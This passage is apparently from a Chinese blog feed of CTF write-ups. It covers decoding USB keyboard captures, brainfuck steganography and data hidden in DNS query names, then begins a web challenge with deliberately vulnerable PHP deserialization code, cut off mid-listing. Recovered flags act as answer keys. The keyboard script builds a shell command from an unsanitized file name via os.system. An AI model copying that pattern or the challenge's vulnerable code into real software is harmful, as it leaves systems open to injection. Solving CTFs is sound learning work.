class="hljs-string">&#x27;^&#x27;</span>),                           <span class="hljs-comment"># 6</span><br>    <span class="hljs-number">0x24</span>: (<span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>),                           <span class="hljs-comment"># 7</span><br>    <span class="hljs-number">0x25</span>: (<span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>),                           <span class="hljs-comment"># 8</span><br>    <span class="hljs-number">0x26</span>: (<span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>),                           <span class="hljs-comment"># 9</span><br>    <span class="hljs-number">0x27</span>: (<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>),                           <span class="hljs-comment"># 0</span><br>    <span class="hljs-number">0x28</span>: (<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>),                         <span class="hljs-comment"># Return (ENTER)</span><br>    <span class="hljs-number">0x29</span>: (<span class="hljs-string">&#x27;[ESC]&#x27;</span>, <span class="hljs-string">&#x27;[ESC]&#x27;</span>),                   <span class="hljs-comment"># Escape</span><br>    <span class="hljs-number">0x2a</span>: (<span class="hljs-string">&#x27;\b&#x27;</span>, <span class="hljs-string">&#x27;\b&#x27;</span>),                         <span class="hljs-comment"># Backspace</span><br>    <span class="hljs-number">0x2b</span>: (<span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>),                         <span class="hljs-comment"># Tab</span><br>    <span class="hljs-number">0x2c</span>: (<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>),                           <span class="hljs-comment"># Spacebar</span><br>    <span class="hljs-number">0x2d</span>: (<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>),                           <span class="hljs-comment"># -</span><br>    <span class="hljs-number">0x2e</span>: (<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>),                           <span class="hljs-comment"># =</span><br>    <span class="hljs-number">0x2f</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>),                           <span class="hljs-comment"># [</span><br>    <span class="hljs-number">0x30</span>: (<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>),                           <span class="hljs-comment"># ]</span><br>    <span class="hljs-number">0x31</span>: (<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>),                          <span class="hljs-comment"># \</span><br>    <span class="hljs-number">0x32</span>: (<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>),                             <span class="hljs-comment"># Non-US # and ~</span><br>    <span class="hljs-number">0x33</span>: (<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>),                           <span class="hljs-comment"># ;</span><br>    <span class="hljs-number">0x34</span>: (<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>),                          <span class="hljs-comment"># &#x27;</span><br>    <span class="hljs-number">0x35</span>: (<span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>),                           <span class="hljs-comment"># `</span><br>    <span class="hljs-number">0x36</span>: (<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>),                           <span class="hljs-comment"># ,</span><br>    <span class="hljs-number">0x37</span>: (<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>),                           <span class="hljs-comment"># .</span><br>    <span class="hljs-number">0x38</span>: (<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>),                           <span class="hljs-comment"># /</span><br>    <span class="hljs-number">0x39</span>: (<span class="hljs-string">&#x27;[CAPSLOCK]&#x27;</span>, <span class="hljs-string">&#x27;[CAPSLOCK]&#x27;</span>),         <span class="hljs-comment"># Caps Lock</span><br>    <span class="hljs-number">0x3a</span>: (<span class="hljs-string">&#x27;[F1]&#x27;</span>, <span class="hljs-string">&#x27;[F1]&#x27;</span>),                     <span class="hljs-comment"># F1</span><br>    <span class="hljs-number">0x3b</span>: (<span class="hljs-string">&#x27;[F2]&#x27;</span>, <span class="hljs-string">&#x27;[F2]&#x27;</span>),                     <span class="hljs-comment"># F2</span><br>    <span class="hljs-number">0x3c</span>: (<span class="hljs-string">&#x27;[F3]&#x27;</span>, <span class="hljs-string">&#x27;[F3]&#x27;</span>),                     <span class="hljs-comment"># F3</span><br>    <span class="hljs-number">0x3d</span>: (<span class="hljs-string">&#x27;[F4]&#x27;</span>, <span class="hljs-string">&#x27;[F4]&#x27;</span>),                     <span class="hljs-comment"># F4</span><br>    <span class="hljs-number">0x3e</span>: (<span class="hljs-string">&#x27;[F5]&#x27;</span>, <span class="hljs-string">&#x27;[F5]&#x27;</span>),                     <span class="hljs-comment"># F5</span><br>    <span class="hljs-number">0x3f</span>: (<span class="hljs-string">&#x27;[F6]&#x27;</span>, <span class="hljs-string">&#x27;[F6]&#x27;</span>),                     <span class="hljs-comment"># F6</span><br>    <span class="hljs-number">0x40</span>: (<span class="hljs-string">&#x27;[F7]&#x27;</span>, <span class="hljs-string">&#x27;[F7]&#x27;</span>),                     <span class="hljs-comment"># F7</span><br>    <span class="hljs-number">0x41</span>: (<span class="hljs-string">&#x27;[F8]&#x27;</span>, <span class="hljs-string">&#x27;[F8]&#x27;</span>),                     <span class="hljs-comment"># F8</span><br>    <span class="hljs-number">0x42</span>: (<span class="hljs-string">&#x27;[F9]&#x27;</span>, <span class="hljs-string">&#x27;[F9]&#x27;</span>),                     <span class="hljs-comment"># F9</span><br>    <span class="hljs-number">0x43</span>: (<span class="hljs-string">&#x27;[F10]&#x27;</span>, <span class="hljs-string">&#x27;[F10]&#x27;</span>),                   <span class="hljs-comment"># F10</span><br>    <span class="hljs-number">0x44</span>: (<span class="hljs-string">&#x27;[F11]&#x27;</span>, <span class="hljs-string">&#x27;[F11]&#x27;</span>),                   <span class="hljs-comment"># F11</span><br>    <span class="hljs-number">0x45</span>: (<span class="hljs-string">&#x27;[F12]&#x27;</span>, <span class="hljs-string">&#x27;[F12]&#x27;</span>),                   <span class="hljs-comment"># F12</span><br>    <span class="hljs-number">0x46</span>: (<span class="hljs-string">&#x27;[PRINTSCREEN]&#x27;</span>, <span class="hljs-string">&#x27;[PRINTSCREEN]&#x27;</span>),   <span class="hljs-comment"># Print Screen</span><br>    <span class="hljs-number">0x47</span>: (<span class="hljs-string">&#x27;[SCROLLLOCK]&#x27;</span>, <span class="hljs-string">&#x27;[SCROLLLOCK]&#x27;</span>),     <span class="hljs-comment"># Scroll Lock</span><br>    <span class="hljs-number">0x48</span>: (<span class="hljs-string">&#x27;[PAUSE]&#x27;</span>, <span class="hljs-string">&#x27;[PAUSE]&#x27;</span>),               <span class="hljs-comment"># Pause</span><br>    <span class="hljs-number">0x49</span>: (<span class="hljs-string">&#x27;[INSERT]&#x27;</span>, <span class="hljs-string">&#x27;[INSERT]&#x27;</span>),             <span class="hljs-comment"># Insert</span><br>    <span class="hljs-number">0x4a</span>: (<span class="hljs-string">&#x27;[HOME]&#x27;</span>, <span class="hljs-string">&#x27;[HOME]&#x27;</span>),                 <span class="hljs-comment"># Home</span><br>    <span class="hljs-number">0x4b</span>: (<span class="hljs-string">&#x27;[PAGEUP]&#x27;</span>, <span class="hljs-string">&#x27;[PAGEUP]&#x27;</span>),             <span class="hljs-comment"># Page Up</span><br>    <span class="hljs-number">0x4c</span>: (<span class="hljs-string">&#x27;[DELETE]&#x27;</span>, <span class="hljs-string">&#x27;[DELETE]&#x27;</span>),             <span class="hljs-comment"># Delete Forward</span><br>    <span class="hljs-number">0x4d</span>: (<span class="hljs-string">&#x27;[END]&#x27;</span>, <span class="hljs-string">&#x27;[END]&#x27;</span>),                   <span class="hljs-comment"># End</span><br>    <span class="hljs-number">0x4e</span>: (<span class="hljs-string">&#x27;[PAGEDOWN]&#x27;</span>, <span class="hljs-string">&#x27;[PAGEDOWN]&#x27;</span>),         <span class="hljs-comment"># Page Down</span><br>    <span class="hljs-number">0x4f</span>: (<span class="hljs-string">&#x27;[RIGHTARROW]&#x27;</span>, <span class="hljs-string">&#x27;[RIGHTARROW]&#x27;</span>),     <span class="hljs-comment"># Right Arrow</span><br>    <span class="hljs-number">0x50</span>: (<span class="hljs-string">&#x27;[LEFTARROW]&#x27;</span>, <span class="hljs-string">&#x27;[LEFTARROW]&#x27;</span>),       <span class="hljs-comment"># Left Arrow</span><br>    <span class="hljs-number">0x51</span>: (<span class="hljs-string">&#x27;[DOWNARROW]&#x27;</span>, <span class="hljs-string">&#x27;[DOWNARROW]&#x27;</span>),       <span class="hljs-comment"># Down Arrow</span><br>    <span class="hljs-number">0x52</span>: (<span class="hljs-string">&#x27;[UPARROW]&#x27;</span>, <span class="hljs-string">&#x27;[UPARROW]&#x27;</span>),           <span class="hljs-comment"># Up Arrow</span><br>    <span class="hljs-number">0x53</span>: (<span class="hljs-string">&#x27;[NUMLOCK]&#x27;</span>, <span class="hljs-string">&#x27;[NUMLOCK]&#x27;</span>),           <span class="hljs-comment"># Num Lock</span><br>    <span class="hljs-number">0x54</span>: (<span class="hljs-string">&#x27;[KEYPADSLASH]&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>),               <span class="hljs-comment"># Keypad /</span><br>    <span class="hljs-number">0x55</span>: (<span class="hljs-string">&#x27;[KEYPADASTERISK]&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>),            <span class="hljs-comment"># Keypad *</span><br>    <span class="hljs-number">0x56</span>: (<span class="hljs-string">&#x27;[KEYPADMINUS]&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>),               <span class="hljs-comment"># Keypad -</span><br>    <span class="hljs-number">0x57</span>: (<span class="hljs-string">&#x27;[KEYPADPLUS]&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>),                <span class="hljs-comment"># Keypad +</span><br>    <span class="hljs-number">0x58</span>: (<span class="hljs-string">&#x27;[KEYPADENTER]&#x27;</span>, <span class="hljs-string">&#x27;[KEYPADENTER]&#x27;</span>),   <span class="hljs-comment"># Keypad ENTER</span><br>    <span class="hljs-number">0x59</span>: (<span class="hljs-string">&#x27;[KEYPAD1]&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>),                   <span class="hljs-comment"># Keypad 1 and End</span><br>    <span class="hljs-number">0x5a</span>: (<span class="hljs-string">&#x27;[KEYPAD2]&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>),                   <span class="hljs-comment"># Keypad 2 and Down Arrow</span><br>    <span class="hljs-number">0x5b</span>: (<span class="hljs-string">&#x27;[KEYPAD3]&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>),                   <span class="hljs-comment"># Keypad 3 and PageDn</span><br>    <span class="hljs-number">0x5c</span>: (<span class="hljs-string">&#x27;[KEYPAD4]&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>),                   <span class="hljs-comment"># Keypad 4 and Left Arrow</span><br>    <span class="hljs-number">0x5d</span>: (<span class="hljs-string">&#x27;[KEYPAD5]&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>),                   <span class="hljs-comment"># Keypad 5</span><br>    <span class="hljs-number">0x5e</span>: (<span class="hljs-string">&#x27;[KEYPAD6]&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>),                   <span class="hljs-comment"># Keypad 6 and Right Arrow</span><br>    <span class="hljs-number">0x5f</span>: (<span class="hljs-string">&#x27;[KEYPAD7]&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>),                   <span class="hljs-comment"># Keypad 7 and Home</span><br>    <span class="hljs-number">0x60</span>: (<span class="hljs-string">&#x27;[KEYPAD8]&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>),                   <span class="hljs-comment"># Keypad 8 and Up Arrow</span><br>    <span class="hljs-number">0x61</span>: (<span class="hljs-string">&#x27;[KEYPAD9]&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>),                   <span class="hljs-comment"># Keypad 9 and Page Up</span><br>    <span class="hljs-number">0x62</span>: (<span class="hljs-string">&#x27;[KEYPAD0]&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>),                   <span class="hljs-comment"># Keypad 0 and Insert</span><br>    <span class="hljs-number">0x63</span>: (<span class="hljs-string">&#x27;[KEYPADPERIOD]&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>),              <span class="hljs-comment"># Keypad . and Delete</span><br>    <span class="hljs-number">0x64</span>: (<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>),                             <span class="hljs-comment"># Non-US \ and |</span><br>    <span class="hljs-number">0x65</span>: (<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>),                             <span class="hljs-comment"># Application</span><br>    <span class="hljs-number">0x66</span>: (<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>),                             <span class="hljs-comment"># Power</span><br>    <span class="hljs-number">0x67</span>: (<span class="hljs-string">&#x27;[KEYPADEQUALS]&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>),              <span class="hljs-comment"># Keypad =</span><br>    <span class="hljs-number">0x68</span>: (<span class="hljs-string">&#x27;[F13]&#x27;</span>, <span class="hljs-string">&#x27;[F13]&#x27;</span>),                   <span class="hljs-comment"># F13</span><br>    <span class="hljs-number">0x69</span>: (<span class="hljs-string">&#x27;[F14]&#x27;</span>, <span class="hljs-string">&#x27;[F14]&#x27;</span>),                   <span class="hljs-comment"># F14</span><br>    <span class="hljs-number">0x6a</span>: (<span class="hljs-string">&#x27;[F15]&#x27;</span>, <span class="hljs-string">&#x27;[F15]&#x27;</span>),                   <span class="hljs-comment"># F15</span><br>    <span class="hljs-number">0x6b</span>: (<span class="hljs-string">&#x27;[F16]&#x27;</span>, <span class="hljs-string">&#x27;[F16]&#x27;</span>),                   <span class="hljs-comment"># F16</span><br>    <span class="hljs-number">0x6c</span>: (<span class="hljs-string">&#x27;[F17]&#x27;</span>, <span class="hljs-string">&#x27;[F17]&#x27;</span>),                   <span class="hljs-comment"># F17</span><br>    <span class="hljs-number">0x6d</span>: (<span class="hljs-string">&#x27;[F18]&#x27;</span>, <span class="hljs-string">&#x27;[F18]&#x27;</span>),                   <span class="hljs-comment"># F18</span><br>    <span class="hljs-number">0x6e</span>: (<span class="hljs-string">&#x27;[F19]&#x27;</span>, <span class="hljs-string">&#x27;[F19]&#x27;</span>),                   <span class="hljs-comment"># F19</span><br>    <span class="hljs-number">0x6f</span>: (<span class="hljs-string">&#x27;[F20]&#x27;</span>, <span class="hljs-string">&#x27;[F20]&#x27;</span>),                   <span class="hljs-comment"># F20</span><br>    <span class="hljs-number">0x70</span>: (<span class="hljs-string">&#x27;[F21]&#x27;</span>, <span class="hljs-string">&#x27;[F21]&#x27;</span>),                   <span class="hljs-comment"># F21</span><br>    <span class="hljs-number">0x71</span>: (<span class="hljs-string">&#x27;[F22]&#x27;</span>, <span class="hljs-string">&#x27;[F22]&#x27;</span>),                   <span class="hljs-comment"># F22</span><br>    <span class="hljs-number">0x72</span>: (<span class="hljs-string">&#x27;[F23]&#x27;</span>, <span class="hljs-string">&#x27;[F23]&#x27;</span>),                   <span class="hljs-comment"># F23</span><br>    <span class="hljs-number">0x73</span>: (<span class="hljs-string">&#x27;[F24]&#x27;</span>, <span class="hljs-string">&#x27;[F24]&#x27;</span>),                   <span class="hljs-comment"># F24</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_boot_keyboard_report</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytearray</span></span>):<br>    modifiers = data[<span class="hljs-number">0</span>] <br>    keys = data[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>]      <br><br>    ctrl = (modifiers &amp; <span class="hljs-number">0x11</span>) != <span class="hljs-number">0</span><br>    shift = (modifiers &amp; <span class="hljs-number">0x22</span>) != <span class="hljs-number">0</span><br>    alt = (modifiers &amp; <span class="hljs-number">0x44</span>) != <span class="hljs-number">0</span><br>    gui = (modifiers &amp; <span class="hljs-number">0x88</span>) != <span class="hljs-number">0</span><br><br>    characters = []<br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:<br>        <span class="hljs-keyword">if</span> key != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> BOOT_KEYBOARD_MAP:<br>                characters.append(BOOT_KEYBOARD_MAP[key][shift])<br>            <span class="hljs-keyword">else</span>:<br>                characters.append(<span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> (ctrl, shift, alt, gui, characters)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">help_formatter</span>(<span class="hljs-params">prog</span>):<br>    <span class="hljs-keyword">return</span> argparse.HelpFormatter(prog, max_help_position=<span class="hljs-number">40</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser(<br>        description=<span class="hljs-string">&#x27;Parse keyboard report data and output as text&#x27;</span>, formatter_class=help_formatter)<br>    parser.add_argument(<span class="hljs-string">&#x27;pcapng_file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;path to the pcapng file&#x27;</span>)<br>    args = parser.parse_args()<br><br>    tmpfile = NamedTemporaryFile(delete=<span class="hljs-literal">False</span>)<br>    tmpfile.close()<br><br>    command = <span class="hljs-string">&quot;tshark -r %s -T fields -e usbhid.data -e usb.capdata &gt; %s&quot;</span> % (<br>        args.pcapng_file, tmpfile.name)<br>    os.system(command)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(tmpfile.name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        lines = f.readlines()<br><br>    os.unlink(tmpfile.name)<br><br>    text = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        capdata = line.strip().replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> capdata:<br>            data = <span class="hljs-built_in">bytearray</span>.fromhex(capdata)<br>            characters = parse_boot_keyboard_report(data)[-<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">for</span> character <span class="hljs-keyword">in</span> characters:<br>                <span class="hljs-keyword">if</span> character:<br>                    text += character<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    raw_text = <span class="hljs-built_in">repr</span>(text)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Raw output:\n<span class="hljs-subst">&#123;raw_text&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Text output:\n<span class="hljs-subst">&#123;text&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16125901.png" alt="2024-11-16125901"></p><h3 id="bft"><a class="markdownIt-Anchor" href="#bft"></a> bft</h3><p>根据题目消息是bft隐写，用bfttools得到文本</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">+++++++++[-&gt;+++++++++&lt;]&gt;+++++++++.&lt;++++[-&gt;++++&lt;]&gt;+++.&lt;+++[-&gt;+++&lt;]&gt;++.&lt;++++[-&gt;----&lt;]&gt;.&lt;+++[-&gt;---&lt;]&gt;-----.&lt;++++++[-&gt;------&lt;]&gt;---.&lt;++++++++[-&gt;++++++++&lt;]&gt;.+++++++.&lt;++++++[-&gt;------&lt;]&gt;---------.&lt;+++++[-&gt;+++++&lt;]&gt;++++.------.++++.&lt;+++++[-&gt;-----&lt;]&gt;-.&lt;+++++[-&gt;+++++&lt;]&gt;++++++.&lt;+++++[-&gt;-----&lt;]&gt;-------.&lt;+++++[-&gt;-----&lt;]&gt;----.&lt;+++++[-&gt;+++++&lt;]&gt;++++.&lt;++++++[-&gt;++++++&lt;]&gt;+++++++++.&lt;+++++++[-&gt;-------&lt;]&gt;--------.&lt;++++[-&gt;----&lt;]&gt;-.&lt;++++++[-&gt;++++++&lt;]&gt;+++++.--.------.&lt;+++++[-&gt;-----&lt;]&gt;-------.&lt;+++++[-&gt;+++++&lt;]&gt;+++++.+++++.-------.&lt;+++++[-&gt;-----&lt;]&gt;.&lt;++++++[-&gt;++++++&lt;]&gt;++.---.&lt;++++[-&gt;----&lt;]&gt;-.&lt;++++++[-&gt;++++++&lt;]&gt;+++.&lt;+++++[-&gt;-----&lt;]&gt;-------.------.&lt;+++[-&gt;+++&lt;]&gt;++++++.&lt;++++[-&gt;++++&lt;]&gt;+++++++.&lt;++++[-&gt;----&lt;]&gt;----.&lt;++++[-&gt;++++&lt;]&gt;+.&lt;++++[-&gt;----&lt;]&gt;.&lt;++++[-&gt;++++&lt;]&gt;.&lt;++++[-&gt;----&lt;]&gt;-.&lt;+++++[-&gt;+++++&lt;]&gt;++++++++.&lt;++++++[-&gt;------&lt;]&gt;--------.&lt;+++++[-&gt;+++++&lt;]&gt;+++++.&lt;+++++[-&gt;-----&lt;]&gt;-----.++++++.------.&lt;+++++[-&gt;+++++&lt;]&gt;++++.&lt;++++[-&gt;----&lt;]&gt;--.&lt;++++++[-&gt;------&lt;]&gt;--.---.&lt;+++[-&gt;+++&lt;]&gt;++++.&lt;<br></code></pre></td></tr></table></figure><p>在线解码一下</p><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16124906.png" alt="2024-11-16124906"></p><p>然后base解密就行</p><p>得到flag{327a6c4304ad5938eaf0efb6cc3e53dc}</p><h3 id="dns"><a class="markdownIt-Anchor" href="#dns"></a> dns</h3><p>dns.qry.name有数据，tshark转json，正则提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 打开文件并逐行处理</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;orange.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> [re.search(<span class="hljs-string">r&#x27;&quot;dns\.qry\.name&quot;: &quot;([0123456789abcdef]+)\.\d+\.\d+\.\d+\.\d+&quot;&#x27;</span>, line)] <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>)<br><br>    <span class="hljs-comment"># 使用生成器过滤数据并按要求取出每四个一组</span><br>    result = [dns <span class="hljs-keyword">for</span> i, dns <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data) <span class="hljs-keyword">if</span> i % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># 将结果合并为一个字符串</span><br>d = <span class="hljs-string">&#x27;&#x27;</span>.join(result)<br><span class="hljs-built_in">print</span>(d)<br></code></pre></td></tr></table></figure><p>先</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -T json -r dns.pcap &gt; orange.json<br></code></pre></td></tr></table></figure><p>再执行脚本得到</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">56476870637942706379426849484e6</span><span class="hljs-keyword">c</span><span class="hljs-number">59334</span>a<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">64434230636</span>d<span class="hljs-number">4675633231706448526</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span>a<span class="hljs-number">43423061484</span>a<span class="hljs-number">766457646</span>f<span class="hljs-number">494752756379427864575679655341364</span>b<span class="hljs-number">534247544546484</span><span class="hljs-keyword">c</span><span class="hljs-number">555</span>a<span class="hljs-number">554e44646</span>a<span class="hljs-number">545667794e6</span>e<span class="hljs-number">425865555</span>a<span class="hljs-number">5453545</span>a<span class="hljs-number">53554664685533493157564</span>a<span class="hljs-number">330</span>a<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16130151.png" alt="2024-11-16130151"></p><p>最后厨子解密得到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DSBCTF2024(复现)</title>
    <link href="/2024/11/14/ctfshow/DSBCTF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/11/14/ctfshow/DSBCTF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>前言:妹打就不代表我不会，跟着题目学习学习吧</p><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h2><h3 id="签到好玩的php"><a class="markdownIt-Anchor" href="#签到好玩的php"></a> 签到·好玩的PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$d</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$ctf</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;d = (<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;d;<br>            <span class="hljs-variable language_">$this</span>-&gt;s = (<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;s;<br>            <span class="hljs-variable language_">$this</span>-&gt;b = (<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;b;<br><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;d != <span class="hljs-variable language_">$this</span>-&gt;s) &amp;&amp; (<span class="hljs-variable language_">$this</span>-&gt;d != <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-variable language_">$this</span>-&gt;s != <span class="hljs-variable language_">$this</span>-&gt;b)) &#123;<br>                <span class="hljs-variable">$dsb</span> = <span class="hljs-variable language_">$this</span>-&gt;d.<span class="hljs-variable language_">$this</span>-&gt;s.<span class="hljs-variable language_">$this</span>-&gt;b;<br><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$dsb</span>) &lt;= <span class="hljs-number">3</span>) &amp;&amp; (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;ctf) &lt;= <span class="hljs-number">3</span>)) &#123;<br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$dsb</span> !== <span class="hljs-variable language_">$this</span>-&gt;ctf) &amp;&amp; (<span class="hljs-variable language_">$this</span>-&gt;ctf !== <span class="hljs-variable">$dsb</span>)) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$dsb</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;ctf)) &#123;<br>                            <span class="hljs-keyword">echo</span> <span 